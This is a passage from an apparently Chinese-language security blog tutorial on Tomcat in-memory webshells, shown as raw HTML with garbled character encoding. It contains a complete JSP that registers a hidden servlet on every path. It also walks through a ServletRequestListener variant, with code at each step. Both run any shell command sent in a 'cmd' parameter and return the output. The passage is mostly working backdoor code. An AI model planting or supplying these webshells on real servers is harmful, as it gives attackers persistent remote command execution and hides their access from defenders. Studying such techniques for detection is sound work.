</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">51
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;%@ page import=&#34;org.apache.catalina.core.StandardContext&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;org.apache.catalina.connector.Request&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;java.util.Scanner&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;java.io.InputStream&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;java.io.IOException&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;org.apache.catalina.Wrapper&#34; %&gt;&lt;%--
</span></span><span style="display:flex;"><span>  Created by IntelliJ IDEA.
</span></span><span style="display:flex;"><span>  User: reus09
</span></span><span style="display:flex;"><span>  Date: 2023/4/15
</span></span><span style="display:flex;"><span>  Time: 20:27
</span></span><span style="display:flex;"><span>  To change this template use File | Settings | File Templates.
</span></span><span style="display:flex;"><span>--%&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page contentType=&#34;text/html;charset=UTF-8&#34; language=&#34;java&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%
</span></span><span style="display:flex;"><span>    Field requestField = request.getClass().getDeclaredField(&#34;request&#34;);
</span></span><span style="display:flex;"><span>    requestField.setAccessible(true);
</span></span><span style="display:flex;"><span>    final Request request1 = (Request) requestField.get(request);
</span></span><span style="display:flex;"><span>    StandardContext standardContext = (StandardContext) request1.getContext();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    HttpServlet servlet = new HttpServlet() {
</span></span><span style="display:flex;"><span>        @Override
</span></span><span style="display:flex;"><span>        protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
</span></span><span style="display:flex;"><span>            if (request.getParameter(&#34;cmd&#34;) != null) {
</span></span><span style="display:flex;"><span>                boolean isLinux = true;
</span></span><span style="display:flex;"><span>                String osTyp = System.getProperty(&#34;os.name&#34;);
</span></span><span style="display:flex;"><span>                if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&#34;win&#34;)) {
</span></span><span style="display:flex;"><span>                    isLinux = false;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                String[] cmds = isLinux ? new String[]{&#34;sh&#34;, &#34;-c&#34;, request.getParameter(&#34;cmd&#34;)} : new String[]{&#34;cmd.exe&#34;, &#34;/c&#34;, request.getParameter(&#34;cmd&#34;)};
</span></span><span style="display:flex;"><span>                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
</span></span><span style="display:flex;"><span>                Scanner s = new Scanner(in).useDelimiter(&#34;\\A&#34;);
</span></span><span style="display:flex;"><span>                String output = s.hasNext() ? s.next() : &#34;&#34;;
</span></span><span style="display:flex;"><span>                response.getWriter().write(&#34;Servlet Injection Success!\n&#34;+output);
</span></span><span style="display:flex;"><span>                response.getWriter().flush();
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Wrapper wrapper = standardContext.createWrapper();
</span></span><span style="display:flex;"><span>    wrapper.setName(&#34;reus09&#34;);
</span></span><span style="display:flex;"><span>    wrapper.setLoadOnStartup(1);
</span></span><span style="display:flex;"><span>    wrapper.setServlet(servlet);
</span></span><span style="display:flex;"><span>    wrapper.setServletClass(servlet.getClass().getName());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    standardContext.addChild(wrapper);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    standardContext.addServletMappingDecoded(&#34;/*&#34;,&#34;reus09&#34;);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    out.print(&#34;Inject Success !&#34;);
</span></span><span style="display:flex;"><span>%&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ¶æ„çš„Servletå·²ç»æ³¨å†Œåˆ°<code>StandardContext</code>çš„Childé‡Œ</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230416115517004.png" alt="image-20230416115517004"  />
</p>
<p>å› ä¸ºæ³¨å†Œçš„<code>url-pattern</code>ä¸º<code>/*</code>ï¼Œæ‰€ä»¥ä»»æ„è·¯å¾„åé¢åŠ <code>?cmd=command</code>å³å¯æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415204309841.png" alt="image-20230415204309841"  />
</p>
<h3 id="listenerå†…å­˜é©¬">Listenerå†…å­˜é©¬<a hidden class="anchor" aria-hidden="true" href="#listenerå†…å­˜é©¬">#</a></h3>
<p>å®ç°äº†EvenListenerçš„ServletRequestListener æ¥å£ï¼Œæä¾›äº†ä¸¤ä¸ªæ–¹æ³•åœ¨ request è¯·æ±‚åˆ›å»ºå’Œé”€æ¯æ—¶è¿›è¡Œå¤„ç†ï¼Œæ¯”è¾ƒé€‚åˆæˆ‘ä»¬ç”¨æ¥åšå†…å­˜é©¬ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415204550416.png" alt="image-20230415204550416"  />
</p>
<h4 id="listenerè°ƒç”¨è¿‡ç¨‹">Listenerè°ƒç”¨è¿‡ç¨‹<a hidden class="anchor" aria-hidden="true" href="#listenerè°ƒç”¨è¿‡ç¨‹">#</a></h4>
<p>servletå¯åŠ¨æ—¶ï¼Œåœ¨<code>StandardHostvalve#invoke()</code>ä¸­å¯¹ç›‘å¬å™¨è¿›è¡Œæ£€æŸ¥</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415205019837.png" alt="image-20230415205019837"  />
</p>
<p>æ¯”è¾ƒå…³é”®çš„æ˜¯ï¼Œä¼šè°ƒç”¨<code>context.fireRequestInitEvent()</code>é‡Œé¢çš„<code>getApplicationEventListeners</code>æ–¹æ³•è·å–å…¨éƒ¨Listener</p>
<p>ç„¶ååˆ¤æ–­æœ‰Listenerå¹¶ä¸”ä¸ºServletRequestListenerå­ç±»ï¼Œå°±è°ƒç”¨ServletRequestListener#requestInitialized()æ–¹æ³•</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415205307804.png" alt="image-20230415205307804"  />
</p>
<p>åŒæ ·ï¼Œåœ¨<code>context.fireRequestDistroyEvent()</code>æ–¹æ³•ä¸­ï¼Œå®ç°äº†å¯¹åº”ç›‘å¬å™¨çš„é”€æ¯ï¼Œä¸åˆå§‹åŒ–æµç¨‹ç›¸è¿‘ï¼Œå°±ä¸åœ¨èµ˜è¿°ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415205444813.png" alt="image-20230415205444813"  />
</p>
<p>ç”±æ­¤å¯è§ç”ŸæˆListeneråªéœ€è¦ç»è¿‡ä¸¤ä¸ªæ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯requestInitialized()ï¼Œä¸€ä¸ªæ˜¯requestDestroyed()ã€‚è¿™ä¸¤ä¸ªæ–¹æ³•é‡å†™åæ•ˆæœæ˜¯ä¸€æ ·çš„</p>
<ul>
<li>æ„å»ºListenerå†…å­˜é©¬æµç¨‹ï¼šç”Ÿæˆæ¶æ„Listenerï¼Œç„¶åæ”¾å…¥Context</li>
</ul>
<h4 id="åˆ©ç”¨è¿‡ç¨‹-2">åˆ©ç”¨è¿‡ç¨‹<a hidden class="anchor" aria-hidden="true" href="#åˆ©ç”¨è¿‡ç¨‹-2">#</a></h4>
<h5 id="è·å–context-1">è·å–Context<a hidden class="anchor" aria-hidden="true" href="#è·å–context-1">#</a></h5>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Field requestField = request.<span style="color:#007f7f">getClass</span>().<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;request&#34;</span>);
</span></span><span style="display:flex;"><span>requestField.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>Request request1 = (Request) requestField.<span style="color:#007f7f">get</span>(request);
</span></span><span style="display:flex;"><span>StandardContext standardContext = (StandardContext) request1.<span style="color:#007f7f">getContext</span>();
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="ç”Ÿæˆæ¶æ„listener">ç”Ÿæˆæ¶æ„listener<a hidden class="anchor" aria-hidden="true" href="#ç”Ÿæˆæ¶æ„listener">#</a></h5>
<p>åˆ›å»ºListeneréœ€è¦æ‰§è¡Œ<code>ServletRequestListener#requestInitialized()</code></p>
<p>é‚£å°±newä¸€ä¸ª<code>ServletRequestListener</code>ç±»ç„¶åé‡å†™<code>requestInitialized</code>æ–¹æ³•å³å¯ã€‚</p>
<p><code>requestInitialized()</code>æ–¹æ³•çš„å‚æ•°ä¸º<code>ServletRequestEvent</code>ç±»çš„å¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>getServletRequest</code>æ–¹æ³•è·å¾—<code>HttpServletRequest</code>å¯¹è±¡ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415210532447.png" alt="image-20230415210532447"  />
</p>
<p>å‘ç°å¹¶æ²¡æœ‰<code>response</code>å¯¹è±¡å®ç°é¡µé¢å›æ˜¾ï¼Œå› ä¸ºæˆ‘ä»¬è·å–<code>StandardContext</code>çš„æ—¶å€™ï¼Œè·å–åˆ°<code>Request</code>ç±»å‹çš„<code>request1</code>,æˆ‘ä»¬å¯ä»¥è°ƒç”¨<code>request1.getResponse()</code>æ¥è·å–ä¸€ä¸ª<code>HttpServletResponse</code>å¯¹è±¡ä»è€Œå®ç°é¡µé¢å›æ˜¾ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415210929671.png" alt="image-20230415210929671"  />
</p>
<p>æ³¨æ„è¿™é‡Œrequest1éœ€è¦ç”¨finalä¿®é¥°ï¼Œä¸ç„¶åœ¨newServletRequestListeneråŒ¿åå†…éƒ¨ç±»é‡Œæ— æ³•ä½¿ç”¨ï¼Œä¼šæŠ¥<code>Cannot refer to the non-final local variable request1 defined in an enclosing scope</code>é”™è¯¯</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>ServletRequestListener listener = <span style="color:#fff;font-weight:bold">new</span> ServletRequestListener() {
</span></span><span style="display:flex;"><span>            @Override
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> requestInitialized(ServletRequestEvent sre) {
</span></span><span style="display:flex;"><span>                HttpServletRequest req = (HttpServletRequest) sre.<span style="color:#007f7f">getServletRequest</span>();
</span></span><span style="display:flex;"><span>                HttpServletResponse resp = request1.<span style="color:#007f7f">getResponse</span>();
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">if</span> (req.<span style="color:#007f7f">getParameter</span>(<span style="color:#0ff;font-weight:bold">&#34;cmd&#34;</span>) != <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">try</span> {
</span></span><span style="display:flex;"><span>                        <span style="color:#fff;font-weight:bold">boolean</span> isLinux = <span style="color:#fff;font-weight:bold">true</span>;
</span></span><span style="display:flex;"><span>                        String osTyp = System.<span style="color:#007f7f">getProperty</span>(<span style="color:#0ff;font-weight:bold">&#34;os.name&#34;</span>);
</span></span><span style="display:flex;"><span>                        <span style="color:#fff;font-weight:bold">if</span> (osTyp != <span style="color:#fff;font-weight:bold">null</span> &amp;&amp; osTyp.<span style="color:#007f7f">toLowerCase</span>().<span style="color:#007f7f">contains</span>(<span style="color:#0ff;font-weight:bold">&#34;win&#34;</span>)) {
</span></span><span style="display:flex;"><span>                            isLinux = <span style="color:#fff;font-weight:bold">false</span>;
</span></span><span style="display:flex;"><span>                        }
</span></span><span style="display:flex;"><span>                        String[] cmds = isLinux ? <span style="color:#fff;font-weight:bold">new</span> String[]{<span style="color:#0ff;font-weight:bold">&#34;sh&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;-c&#34;</span>, req.<span style="color:#007f7f">getParameter</span>(<span style="color:#0ff;font-weight:bold">&#34;cmd&#34;</span>)} : <span style="color:#fff;font-weight:bold">new</span> String[]{<span style="color:#0ff;font-weight:bold">&#34;cmd.exe&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;/c&#34;</span>, req.<span style="color:#007f7f">getParameter</span>(<span style="color:#0ff;font-weight:bold">&#34;cmd&#34;</span>)};
</span></span><span style="display:flex;"><span>                        InputStream in = Runtime.<span style="color:#007f7f">getRuntime</span>().<span style="color:#007f7f">exec</span>(cmds).<span style="color:#007f7f">getInputStream</span>();
</span></span><span style="display:flex;"><span>                        Scanner s = <span style="color:#fff;font-weight:bold">new</span> Scanner(in).<span style="color:#007f7f">useDelimiter</span>(<span style="color:#0ff;font-weight:bold">&#34;\\A&#34;</span>);
</span></span><span style="display:flex;"><span>                        String out = s.<span style="color:#007f7f">hasNext</span>() ? s.<span style="color:#007f7f">next</span>() : <span style="color:#0ff;font-weight:bold">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>                        resp.<span style="color:#007f7f">getWriter</span>().<span style="color:#007f7f">write</span>(<span style="color:#0ff;font-weight:bold">&#34;Listener Injection Success&#34;</span> + out);
</span></span><span style="display:flex;"><span>                        resp.<span style="color:#007f7f">getWriter</span>().<span style="color:#007f7f">flush</span>();
</span></span><span style="display:flex;"><span>                    } <span style="color:#fff;font-weight:bold">catch</span> (IOException ioe) {
</span></span><span style="display:flex;"><span>                        ioe.<span style="color:#007f7f">printStackTrace</span>();
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            @Override
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> requestDestroyed(ServletRequestEvent sre) {
</span></span><span style="display:flex;"><span>                System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;1&#34;</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        };
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="æ·»åŠ listener">æ·»åŠ listener<a hidden class="anchor" aria-hidden="true" href="#æ·»åŠ listener">#</a></h5>
<p><code>StandardContext</code>å®ç°äº†<code>addApplicationEventListener()</code>å‘<code>applicationEventListenersList</code>ä¸­æ·»åŠ <code>listerer</code>ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415211059805.png" alt="image-20230415211059805"  />
</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>standardContext.<span style="color:#007f7f">addApplicationEventListener</span>(listener);
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="æ•ˆæœ-2">æ•ˆæœ<a hidden class="anchor" aria-hidden="true" href="#æ•ˆæœ-2">#</a></h5>
<p>å®Œæ•´ä»£ç ï¼š</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
